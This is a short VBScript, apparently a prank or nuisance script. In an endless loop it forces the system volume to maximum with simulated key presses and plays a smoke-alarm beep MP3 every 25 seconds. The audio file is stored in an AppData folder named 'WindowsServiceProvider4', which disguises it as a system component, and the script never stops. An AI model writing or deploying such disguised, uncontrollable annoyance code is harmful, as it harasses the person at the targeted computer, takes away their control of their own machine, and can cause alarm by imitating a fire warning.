Option Explicit

Dim objShell, player, i
Set objShell = CreateObject("WScript.Shell")

' Create WMP player once and reuse
Set player = CreateObject("WMPlayer.OCX")

' Path to your MP3 (change if needed)
Const mp3Path = "%APPDATA%\WindowsServiceProvider4\SmokeBeep.MP3"

Do
    ' --- Step 1: Force master volume to maximum by simulating many volume-up key presses ---
    For i = 1 To 55
        objShell.SendKeys(chr(175))  ' volume up key
    Next

    ' --- Step 2: Ensure WMP internal volume is full, stop any previous playback, then play ---
    On Error Resume Next
    player.controls.stop
    On Error GoTo 0

    player.settings.volume = 100
    player.URL = mp3Path
    player.Controls.play

    ' --- Step 3: Wait 25 seconds before repeating (25000 ms) ---
    WScript.Sleep 25000

Loop
